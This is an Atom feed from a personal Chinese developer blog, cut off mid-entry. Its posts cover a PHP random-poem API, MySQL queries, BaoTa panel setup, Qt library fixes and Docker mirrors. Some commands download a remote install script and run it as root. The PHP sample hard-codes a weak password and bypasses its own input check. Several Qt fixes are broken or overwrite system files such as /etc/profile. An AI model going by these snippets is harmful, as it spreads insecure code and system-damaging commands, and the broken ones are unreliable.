<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Codes of huaring</title>
  
  <subtitle>LITHIUMICE</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hualin.online/"/>
  <updated>2019-09-16T15:11:38.060Z</updated>
  <id>https://hualin.online/</id>
  
  <author>
    <name>lithiumice</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Get Random Poems From Phpserver</title>
    <link href="https://hualin.online/get-random-poems-from-phpserver/"/>
    <id>https://hualin.online/get-random-poems-from-phpserver/</id>
    <published>2019-09-16T15:05:42.000Z</published>
    <updated>2019-09-16T15:11:38.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="最全中华古诗词数据库"><a href="#最全中华古诗词数据库" class="headerlink" title="最全中华古诗词数据库"></a>最全中华古诗词数据库</h2><p>唐宋两朝近一万四千古诗人, 接近5.5万首唐诗加26万宋诗. 两宋时期1564位词人，21050首词<br>地址: <a href="https://github.com/chinese-poetry/chinese-poetry" target="_blank" rel="noopener">https://github.com/chinese-poetry/chinese-poetry</a></p><h2 id="转换脚本"><a href="#转换脚本" class="headerlink" title="转换脚本"></a>转换脚本</h2><p>古诗词、唐诗宋词转换成mysql sql 文件的PHP脚本<br>地址: <a href="https://github.com/woodylan/chinese-poetry-to-mysql-tool" target="_blank" rel="noopener">https://github.com/woodylan/chinese-poetry-to-mysql-tool</a></p><h2 id="使用的服务器端代码"><a href="#使用的服务器端代码" class="headerlink" title="使用的服务器端代码"></a>使用的服务器端代码</h2><pre><code>&lt;?php    //函数：用于把数据封装为 JSON 格式    function echoJSON($withStatus,$andMessage){        $data = array(&#39;status&#39; =&gt; $withStatus, &#39;message&#39; =&gt; $andMessage);        $jsonstring = json_encode($data);        header(&#39;Content-Type: application/json&#39;);        echo $jsonstring;    }    $user = &#39;poetry&#39;;    $password = &#39;123qwe&#39;;    $db = &#39;poetry&#39;;    $host = &#39;localhost&#39;;    $port = 3306;    $con=mysqli_init();    $is_success = mysqli_real_connect(                                   $con,                                   $host,                                   $user,                                   $password,                                   $db,                                   $port                                   );    if(!$is_success){echoJSON(false,&quot;Connect Error: &quot; . mysqli_connect_error());}    $id = $_GET[&quot;id&quot;];    if(true || is_numeric($id)){      $sql=&quot;SELECT *      FROM poems AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM poems)-(SELECT MIN(id) FROM poems))+(SELECT MIN(id) FROM poems)) AS id) AS t2      WHERE t1.id &gt;= t2.id      ORDER BY t1.id LIMIT 1;&quot;;      $result = mysqli_query($con,$sql);      $row = mysqli_fetch_array($result);      $data = array(&#39;status&#39; =&gt; true, &#39;title&#39; =&gt; $row[&quot;title&quot;], &#39;author&#39; =&gt; $row[&quot;author&quot;], &#39;content&#39; =&gt; $row[&quot;content&quot;]);      $jsonstring = json_encode($data);      header(&#39;Content-Type: application/json&#39;);      echo $jsonstring;    }else{      echoJSON(false,&quot;unsupported id&quot;);    }    mysqli_close($link);?&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;最全中华古诗词数据库&quot;&gt;&lt;a href=&quot;#最全中华古诗词数据库&quot; class=&quot;headerlink&quot; title=&quot;最全中华古诗词数据库&quot;&gt;&lt;/a&gt;最全中华古诗词数据库&lt;/h2&gt;&lt;p&gt;唐宋两朝近一万四千古诗人, 接近5.5万首唐诗加26万宋诗.
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Learn Mysql</title>
    <link href="https://hualin.online/learn-mysql/"/>
    <id>https://hualin.online/learn-mysql/</id>
    <published>2019-09-16T14:55:00.000Z</published>
    <updated>2019-09-16T15:01:37.868Z</updated>
    
    <content type="html"><![CDATA[<pre><code>SELECT * FROM `table` AS t1 JOIN(SELECT ROUNDRAND() * (SELECT MAX(id) FROM `table`)) AS id) AS t2WHERE t1.id &gt;= t2.idORDER BY t1.id ASC LIMIT 5;SELECT * FROM `table`WHERE id &gt;= (SELECT floor( RAND() * ((SELECT MAX(id) FROM `table`)-(SELECT MIN(id) FROM `table`)) + (SELECT MIN(id) FROM `table`))) ORDER BY id LIMIT 1;SELECT *FROM `table` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `table`)-(SELECT MIN(id) FROM `table`))+(SELECT MIN(id) FROM `table`)) AS id) AS t2WHERE t1.id &gt;= t2.idORDER BY t1.id LIMIT 1;</code></pre><p>SELECT <em><br>FROM poems AS t1 JOIN (SELECT ROUND(RAND() </em> ((SELECT MAX(id) FROM poems)-(SELECT MIN(id) FROM poems))+(SELECT MIN(id) FROM poems)) AS id) AS t2<br>WHERE t1.id &gt;= t2.id<br>ORDER BY t1.id LIMIT 1;</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;pre&gt;&lt;code&gt;SELECT * FROM `table` AS t1 JOIN(SELECT ROUND
RAND() * (SELECT MAX(id) FROM `table`)) AS id) AS t2
WHERE t1.id &amp;gt;= t2.id
ORDER
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BT Linux</title>
    <link href="https://hualin.online/bt-linux/"/>
    <id>https://hualin.online/bt-linux/</id>
    <published>2019-09-16T13:10:50.000Z</published>
    <updated>2019-09-16T13:17:18.549Z</updated>
    
    <content type="html"><![CDATA[<pre><code>Centos安装脚本yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install.sh &amp;&amp; sh install.shUbuntu/Deepin安装脚本wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh &amp;&amp; sudo bash install.shDebian安装脚本wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh &amp;&amp; bash install.shFedora安装脚本wget -O install.sh http://download.bt.cn/install/install.sh &amp;&amp; bash install.sh卸载 /etc/init.d/bt stop &amp;&amp; chkconfig --del bt &amp;&amp; rm -f /etc/init.d/bt &amp;&amp; rm -rf /www/server/panel强制修改MySQL管理(root)密码，如要改成123456cd /www/server/panel &amp;&amp; python tools.py root 123456查看宝塔日志cat /tmp/panelBoot.pl清理登陆限制rm -f /www/server/panel/data/*.login查看数据库错误日志cat /www/server/data/*.err站点配置文件目录(nginx)/www/server/panel/vhost/nginx数据库备份目录/www/backup/database数据存储目录/www/server/data</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;pre&gt;&lt;code&gt;Centos安装脚本
yum install -y wget &amp;amp;&amp;amp; wget -O install.sh http://download.bt.cn/install/install.sh &amp;amp;&amp;amp; sh
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Learn Php</title>
    <link href="https://hualin.online/learn-php/"/>
    <id>https://hualin.online/learn-php/</id>
    <published>2019-09-16T13:06:34.000Z</published>
    <updated>2019-09-16T14:14:57.375Z</updated>
    
    <content type="html"><![CDATA[<h3 id="for-php-gt-7-2"><a href="#for-php-gt-7-2" class="headerlink" title="for php &gt; 7.2"></a>for php &gt; 7.2</h3><pre><code>pecl install libsodiumextension=sodium.so</code></pre><h2 id="install-php"><a href="#install-php" class="headerlink" title="install php"></a>install php</h2><pre><code>pecl install libsodiumextension=sodium.so &gt;&gt; php.iniphp -a //interactive shellshow variables like port;set name utf8;source test.sqlmysqldump -u dbuser -p dbname &gt; dbname.sqlmysql -uabc_f -p abc &lt; abc.sqlmysqldump -u用户名 -p密码 -d 数据库名`title`, `author`, `content`mysqldump -u用户名 -p databaseSELECT COUNT(*) FROM databasesed -i &#39;s/tb_poems/poems/g&#39; chinese-poetry-3.sql</code></pre><h3 id="mysql-command"><a href="#mysql-command" class="headerlink" title="mysql command"></a>mysql command</h3><pre><code>&#39;;&#39;?         (\?) Synonym for `help&#39;.clear     (\c) Clear the current input statement.connect   (\r) Reconnect to the server. Optional arguments are db and host.delimiter (\d) Set statement delimiter.edit      (\e) Edit command with $EDITOR.ego       (\G) Send command to MariaDB server, display result vertically.exit      (\q) Exit mysql. Same as quit.go        (\g) Send command to MariaDB server.help      (\h) Display this help.nopager   (\n) Disable pager, print to stdout.notee     (\t) Don&#39;t write into outfile.pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.print     (\p) Print current command.prompt    (\R) Change your mysql prompt.quit      (\q) Quit mysql.rehash    (\#) Rebuild completion hash.source    (\.) Execute an SQL script file. Takes a file name as an argument.status    (\s) Get status information from the server.system    (\!) Execute a system shell command.tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.use       (\u) Use another database. Takes database name as argument.charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.warnings  (\W) Show warnings after every statement.nowarning (\w) Don&#39;t show warnings after every statement.</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;for-php-gt-7-2&quot;&gt;&lt;a href=&quot;#for-php-gt-7-2&quot; class=&quot;headerlink&quot; title=&quot;for php &amp;gt; 7.2&quot;&gt;&lt;/a&gt;for php &amp;gt; 7.2&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;pecl
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Software on Linux</title>
    <link href="https://hualin.online/software-on-linux/"/>
    <id>https://hualin.online/software-on-linux/</id>
    <published>2019-09-16T10:56:33.000Z</published>
    <updated>2019-09-16T11:01:09.418Z</updated>
    
    <content type="html"><![CDATA[<h3 id="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"><a href="#记录一下我使用Linux遇到的有用或者无用但是美妙的软件" class="headerlink" title="记录一下我使用Linux遇到的有用或者无用但是美妙的软件"></a>记录一下我使用Linux遇到的有用或者无用但是美妙的软件</h3><p>sublime-text-dev-3<br>code vscode<br>vmware<br>virtualbox<br>remmina<br>octopi<br>deepin.qq.office<br>deepin-thunderspeed<br>deepin-boot-maker<br>baidupan<br>genymotion<br>netease-cloud-music<br>google-chrome<br>goldendict<br>redshift<br>wps-office<br>youdao-note<br>atom<br>gparted<br>robot3t<br>sequeler<br>sql workbench<br>studio3t<br>ratpoison<br>openbox<br>qt5 qtcreator<br>redis<br>mongodb<br>dokcer<br>tmux<br>docky<br>dbKoda<br>apt-fast<br>topgrade<br>tmux终端工具<br>stacer系统管理工具<br>oh-my-zsh终端模拟器<br>SmartGit仓库管理可视化工具<br>Docky<br>Peek<br>Inkscape<br>gimp<br>WebTorrent、FrostWire<br>dbKoda mongodb非关系数据库GUI工具<br>apt-fast<br>topgrade一个命令更新linux里面的所有软件</p><h3 id="chrome-extension"><a href="#chrome-extension" class="headerlink" title="chrome extension:"></a>chrome extension:</h3><p>infinity pro 标签页<br>Octotree github文件资源浏览树更方便地查看项目结构和页面跳转<br>Postman api test<br>SwitchyOmega<br>SimpRead - 简阅<br>Full Page Screen Capture<br>油猴tampermonkey<br>Checker Plus for Gmail</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;记录一下我使用Linux遇到的有用或者无用但是美妙的软件&quot;&gt;&lt;a href=&quot;#记录一下我使用Linux遇到的有用或者无用但是美妙的软件&quot; class=&quot;headerlink&quot;
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>QT5 Issues</title>
    <link href="https://hualin.online/qt5-issues/"/>
    <id>https://hualin.online/qt5-issues/</id>
    <published>2019-09-16T10:41:24.000Z</published>
    <updated>2019-09-16T14:32:58.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="qt6-libraries-errors"><a href="#qt6-libraries-errors" class="headerlink" title="qt6 libraries errors"></a>qt6 libraries errors</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.bashrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/bin&#39; &gt;&gt; sudo tee ~/.bashrcsource ~/.bashrc</code></pre><p>or</p><pre><code>echo &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; | sudo tee /etc/profileecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; | sudo tee /etc/profilesource /etc/profile</code></pre><p>cp /etc/skel/.profile </p><h2 id="as-for-zsh-bash"><a href="#as-for-zsh-bash" class="headerlink" title="as for zsh bash"></a>as for zsh bash</h2><pre><code>strings /usr/lib64/libstdc++.so.6 | grep GLIBCecho &#39;LD_LIBRARY_PATH=/usr/local/qt5.13.0/5.13.0/gcc_64/lib/&#39; &gt;&gt; sudo tee ~/.zshrcecho &#39;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH&#39; &gt;&gt; sudo tee ~/.zshrcsource ~/.zshrc</code></pre><p>add a custom .conf file to /etc/ld.so.conf.d, for example<br>sudo gedit /etc/ld.so.conf.d/randomLibs.conf<br>inside the file you are supposed to write the complete path to the directory that contains all the libraries that you wish to add to the system, for example:</p><pre><code>/usr/local/qt5.13.0/5.13.0/gcc_64/lib/lib/x86_64-linux-gnu</code></pre><h2 id="update-qt-gcc-lib"><a href="#update-qt-gcc-lib" class="headerlink" title="update qt gcc lib"></a>update qt gcc lib</h2><pre><code>cp /home/gcc-5.2.0/gcc-temp/stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64cd /usr/lib64rm -rf libstdc++.so.6ln -s libstdc++.so.6.0.21 libstdc++.so.6</code></pre><pre><code>sudo rm -f /usr/plugins/imageformats/libqico.sosudo ln -s /usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so /usr/plugins/imageformats/libqico.soexport LD_PRELOAD=/usr/local/Qt5.13.0/5.13.0/gcc_64/plugins/imageformats/libqico.so</code></pre><h2 id="lib-errors"><a href="#lib-errors" class="headerlink" title="lib errors"></a>lib errors</h2><pre><code>cat /etc/ld.so.confecho &quot;/usr/local/lib&quot; | sudo tee /etc/ld.so.confsudo ldconfig</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;qt6-libraries-errors&quot;&gt;&lt;a href=&quot;#qt6-libraries-errors&quot; class=&quot;headerlink&quot; title=&quot;qt6 libraries errors&quot;&gt;&lt;/a&gt;qt6 libraries
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Compress PIC Shell 批量压缩图片脚本</title>
    <link href="https://hualin.online/compress-pic-shell-pi-liang-ya-suo-tu-pian-jiao-ben/"/>
    <id>https://hualin.online/compress-pic-shell-pi-liang-ya-suo-tu-pian-jiao-ben/</id>
    <published>2019-09-14T15:03:28.000Z</published>
    <updated>2019-09-16T11:53:57.975Z</updated>
    
    <content type="html"><![CDATA[<!-- col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text --><!-- coverPostsCount > 0 && theme.cover.showPrevNext --><p>在写博客的时候需要将图片上传到服务器,很显然如果一张图片未经压缩有时会达到2-3M,严重影响访问者的加载速度. 所以我写了一个脚本放在博客根目录,能够历遍文件夹下的所以图片并将大于指定大小的图片进行压缩.</p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashSPATH=./maxsize=921600 #900KBAFTERFIX=""COMPRESS () {        imgpath=$1        filesize=`ls -l $imgpath | awk '{ print $5 }'`        echo $filesize        if [ $filesize -ge $maxsize ]            then              echo compressing $file              afterfix=${filename##*.}              name=${filename%.*}              convert -quality 80% $imgpath $imgpath              # convert -quality 80% $imgpath "${name}s.${afterfix}"              echo compressed $imgpath            else              echo skiped $imgpath        fi      }echo "begin"filelist=`find $1 -regex ".*/.*.jpg" -o -regex ".*/.*.png"`for file in $filelist do  if [ -f $file ]   then    COMPRESS $file  fidoneecho "finished"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;!-- col l8 offset-l2 m10 offset-m1 s10 offset-s1 center-align text --&gt;
&lt;!-- coverPostsCount &gt; 0 &amp;&amp; theme.cover.showPrevNext
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Shell Intro</title>
    <link href="https://hualin.online/shell-intro/"/>
    <id>https://hualin.online/shell-intro/</id>
    <published>2019-09-14T10:28:24.000Z</published>
    <updated>2019-09-14T10:31:46.687Z</updated>
    
    <content type="html"><![CDATA[<h3 id="wget-命令"><a href="#wget-命令" class="headerlink" title="wget 命令"></a>wget 命令</h3><p>wget -O filename<br>-limit-rate<br>-c 断电续传<br>-b 后台<br>wget –user-agent=<br>–tries=10<br>wget -i filelist.txt<br>wget –mirror –reject-gif -Q 5m -p –convert-links -P ./LOCAL URL<br>-r -A.pdf 下载指定格式</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h3 id=&quot;wget-命令&quot;&gt;&lt;a href=&quot;#wget-命令&quot; class=&quot;headerlink&quot; title=&quot;wget 命令&quot;&gt;&lt;/a&gt;wget 命令&lt;/h3&gt;&lt;p&gt;wget -O filename&lt;br&gt;-limit-rate&lt;br&gt;-c 断电续传&lt;br&gt;-b
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Learn Markdown</title>
    <link href="https://hualin.online/learn-markdown/"/>
    <id>https://hualin.online/learn-markdown/</id>
    <published>2019-09-14T10:26:40.000Z</published>
    <updated>2019-09-14T15:07:23.338Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table><p>-: 设置内容和标题栏居右对齐。<br>:- 设置内容和标题栏居左对齐。<br>:-: 设置内容和标题栏居中对齐。</p><p>hexo g –debug</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;表头&lt;/th&gt;
&lt;th&gt;表头&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;单元格&lt;/td&gt;
&lt;td&gt;单元格&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;单元格&lt;/td&gt;
&lt;td&gt;单元格&lt;/td&gt;
&lt;/tr&gt;
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Invoke Virtual Method ... on Null Reference</title>
    <link href="https://hualin.online/invoke-virtual-method-on-null-reference/"/>
    <id>https://hualin.online/invoke-virtual-method-on-null-reference/</id>
    <published>2019-09-14T06:59:23.000Z</published>
    <updated>2019-09-14T15:01:42.959Z</updated>
    
    <content type="html"><![CDATA[<p>在fragment中调用显示布局文件,需要先获得View对象,然后才能使用findViewById方法:</p><pre><code>View v = inflater.inflate(R.layout.fragment, container, false);listView = v.findViewById(R.id.list_view);MyDialog myDialog = new MyDialog(getContext());myDialog.show();</code></pre><h3 id="获取当前Activity和Context"><a href="#获取当前Activity和Context" class="headerlink" title="获取当前Activity和Context"></a>获取当前Activity和Context</h3><p>public MyLocationListener(View view){<br>    this.view=view;<br>}<br>View cv = getWindow().getDecorView();<br>getActivity().getApplicationContext()</p><h3 id="CoordinatorLayout-layout-anchor-不正常"><a href="#CoordinatorLayout-layout-anchor-不正常" class="headerlink" title="CoordinatorLayout layout_anchor 不正常"></a>CoordinatorLayout layout_anchor 不正常</h3><p>automatically offset a view to place it below the AppBarLayout. It only works with an AppBarLayout<br>app:layout_behavior=”@string/appbar_scrolling_view_behavior”</p><h3 id="在fragment-view中添加baidumap的mapview方法"><a href="#在fragment-view中添加baidumap的mapview方法" class="headerlink" title="在fragment view中添加baidumap的mapview方法"></a>在fragment view中添加baidumap的mapview方法</h3><p>SDKInitializer.initialize(getActivity().getApplicationContext());<br>View view=inflater.inflate(R.layout.fragment_gallery,container,false);<br>mapView=view.findViewById(R.id.bmapview);<br>mapView.onCreate(getContext(),savedInstanceState);</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;在fragment中调用显示布局文件,需要先获得View对象,然后才能使用findViewById方法:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;View v = inflater.inflate(R.layout.fragment, container,
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker 配置镜像</title>
    <link href="https://hualin.online/docker-pei-zhi-jing-xiang/"/>
    <id>https://hualin.online/docker-pei-zhi-jing-xiang/</id>
    <published>2019-09-14T06:38:53.000Z</published>
    <updated>2019-09-14T06:41:45.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用的加速地址"><a href="#常用的加速地址" class="headerlink" title="常用的加速地址"></a>常用的加速地址</h2><p><a href="http://f1361db2.m.daocloud.io" target="_blank" rel="noopener">http://f1361db2.m.daocloud.io</a><br><a href="https://hub.daocloud.io/" target="_blank" rel="noopener">https://hub.daocloud.io/</a><br><a href="https://c.163.com/hub#/m/home/" target="_blank" rel="noopener">https://c.163.com/hub#/m/home/</a><br><a href="https://registry.docker-cn.com" target="_blank" rel="noopener">https://registry.docker-cn.com</a><br><a href="http://hub-mirror.c.163.com" target="_blank" rel="noopener">http://hub-mirror.c.163.com</a><br><a href="https://3laho3y3.mirror.aliyuncs.com" target="_blank" rel="noopener">https://3laho3y3.mirror.aliyuncs.com</a><br><a href="http://f1361db2.m.daocloud.io" target="_blank" rel="noopener">http://f1361db2.m.daocloud.io</a><br><a href="https://mirror.ccs.tencentyun.com" target="_blank" rel="noopener">https://mirror.ccs.tencentyun.com</a></p><h2 id="使用shell命令配置"><a href="#使用shell命令配置" class="headerlink" title="使用shell命令配置"></a>使用shell命令配置</h2><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashsudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json <<-'EOF'{  "registry-mirrors"["https://wl4i5g2z.mirror.aliyuncs.com"]"live-restore": true}EOFsudo systemctl daemon-reloadsudo systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="直接修改service文件"><a href="#直接修改service文件" class="headerlink" title="直接修改service文件"></a>直接修改service文件</h2><pre><code>vim /usr/lib/systemd/system/docker.service# 在dockerd后面加参数ExecStart=/usr/bin/dockerd --registry-mirror=&lt;your accelerate address&gt;sudo systemctl daemon-reloadsudo systemctl restart docker</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;常用的加速地址&quot;&gt;&lt;a href=&quot;#常用的加速地址&quot; class=&quot;headerlink&quot; title=&quot;常用的加速地址&quot;&gt;&lt;/a&gt;常用的加速地址&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://f1361db2.m.daocloud.io&quot;
        
      
    
    </summary>
    
    
      <category term="docker linux" scheme="https://hualin.online/tags/docker-linux/"/>
    
  </entry>
  
  <entry>
    <title>Some Informations</title>
    <link href="https://hualin.online/some-informations/"/>
    <id>https://hualin.online/some-informations/</id>
    <published>2019-09-12T14:44:56.000Z</published>
    <updated>2019-09-14T06:57:41.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="百度云资料"><a href="#百度云资料" class="headerlink" title="百度云资料"></a>百度云资料</h2><p>个人整理的编程、大学资料、文学等的书籍<br>存在百度云里，可自行转存<br><a href="https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA" target="_blank" rel="noopener">https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA</a> 提取码: mc5d <a href="https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA" target="_blank" rel="noopener">https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA</a> 提取码: ty5e</p><h2 id="图标库"><a href="#图标库" class="headerlink" title="图标库"></a>图标库</h2><ul><li>阿里巴巴图标库 <a href="http://www.iconfont.cn" target="_blank" rel="noopener">http://www.iconfont.cn</a></li><li>icon8 <a href="https://icons8.com" target="_blank" rel="noopener">https://icons8.com</a></li><li>easyicon <a href="http://www.easyicon.net" target="_blank" rel="noopener">http://www.easyicon.net</a></li><li>iconpng <a href="http://iconpng.com" target="_blank" rel="noopener">http://iconpng.com</a></li><li>iconninja <a href="http://iconninja.com" target="_blank" rel="noopener">http://iconninja.com</a></li><li>Roundicons.com <a href="http://Roundicons.com" target="_blank" rel="noopener">http://Roundicons.com</a></li><li>undraw <a href="https://undraw.co/illustrations" target="_blank" rel="noopener">https://undraw.co/illustrations</a></li><li>instantlogosearch <a href="http://instantlogosearch.com/" target="_blank" rel="noopener">http://instantlogosearch.com/</a></li><li>logomaker <a href="https://logomakr.com/" target="_blank" rel="noopener">https://logomakr.com/</a></li><li>flaticon <a href="https://www.flaticon.com/" target="_blank" rel="noopener">https://www.flaticon.com/</a></li></ul><h2 id="搜索网站"><a href="#搜索网站" class="headerlink" title="搜索网站"></a>搜索网站</h2><ul><li><p>Bing 国际版：<a href="https://cn.bing.com/" target="_blank" rel="noopener">https://cn.bing.com/</a></p></li><li><p>DuckDuckGo：<a href="https://duckduckgo.com/" target="_blank" rel="noopener">https://duckduckgo.com/</a> 保护你的隐私</p></li><li><p>Stack Overflow：<a href="https://stackoverflow.com/" target="_blank" rel="noopener">https://stackoverflow.com/</a> 程序员的问题基本都可以在这里得到解决</p></li><li><p>Gitlogs：<a href="https://www.gitlogs.com/" target="_blank" rel="noopener">https://www.gitlogs.com/</a><br>Gitlogs 是专门针对 GitHub 项目的搜索引擎，我们通过他可以快速找到想要项目。</p></li><li><p>jiumo search 鸠摩搜书：<a href="https://www.jiumodiary.com/。" target="_blank" rel="noopener">https://www.jiumodiary.com/。</a><br>可以用来找一些技术文档手册，很多在百度网盘里。</p></li><li><p>Ebooke：<a href="https://ebookee.org/" target="_blank" rel="noopener">https://ebookee.org/</a><br>Ebookee 是一个基于互联网并提供免费电子图书下载的搜索引擎网站。</p></li><li><p>Iconfinder图标搜索：<a href="https://www.iconfinder.com/" target="_blank" rel="noopener">https://www.iconfinder.com/</a><br>用来查找 logo 图片。</p></li><li><p>TinEye：<a href="https://www.tineye.com" target="_blank" rel="noopener">https://www.tineye.com</a><br>用图片来检索图片，我们可以上传图片或输入图片的 URL 来检索。</p></li><li><p>SemanticScholar：<a href="https://www.semanticscholar.org/" target="_blank" rel="noopener">https://www.semanticscholar.org/</a><br>SemanticScholar 是一个免费学术搜索引擎，其检索结果来自于期刊、学术会议资料或者是学术机构的文献。</p></li><li><p>LibreStock：<a href="https://librestock.com/" target="_blank" rel="noopener">https://librestock.com/</a><br>LibreStock 上可以检索一些优质的高清图片。</p></li><li><p>CC Search：<a href="https://ccsearch.creativecommons.org/" target="_blank" rel="noopener">https://ccsearch.creativecommons.org/</a><br>CC Search 上搜索到的图片资源都是无版权的，我们可以免费的使用。</p></li><li><p>搜索论文等 <a href="https://libgen.is/" target="_blank" rel="noopener">https://libgen.is/</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;百度云资料&quot;&gt;&lt;a href=&quot;#百度云资料&quot; class=&quot;headerlink&quot; title=&quot;百度云资料&quot;&gt;&lt;/a&gt;百度云资料&lt;/h2&gt;&lt;p&gt;个人整理的编程、大学资料、文学等的书籍&lt;br&gt;存在百度云里，可自行转存&lt;br&gt;&lt;a
        
      
    
    </summary>
    
    
      <category term="资料" scheme="https://hualin.online/tags/%E8%B5%84%E6%96%99/"/>
    
  </entry>
  
  <entry>
    <title>Some Thoughts</title>
    <link href="https://hualin.online/some-thoughts/"/>
    <id>https://hualin.online/some-thoughts/</id>
    <published>2019-09-12T14:44:37.000Z</published>
    <updated>2019-09-12T14:45:37.004Z</updated>
    
    <content type="html"><![CDATA[<p>从很久以前开始，看完了一本书，一部动漫，一部电影，无论它的结局是喜悦还是悲伤的，我总会感到怅然若失，就像告别了一个挚友，经历了一段波澜起伏的人生，因而突发一种沧桑感，经历了一个不愿醒来的梦境，梦醒时却发觉自己仍在原地。</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;从很久以前开始，看完了一本书，一部动漫，一部电影，无论它的结局是喜悦还是悲伤的，我总会感到怅然若失，就像告别了一个挚友，经历了一段波澜起伏的人生，因而突发一种沧桑感，经历了一个不愿醒来的梦境，梦醒时却发觉自己仍在原地。&lt;/p&gt;

        
      
    
    </summary>
    
    
      <category term="随感 杂感" scheme="https://hualin.online/tags/%E9%9A%8F%E6%84%9F-%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux Skills</title>
    <link href="https://hualin.online/linux-skills/"/>
    <id>https://hualin.online/linux-skills/</id>
    <published>2019-09-12T14:31:18.000Z</published>
    <updated>2019-09-12T14:46:52.384Z</updated>
    
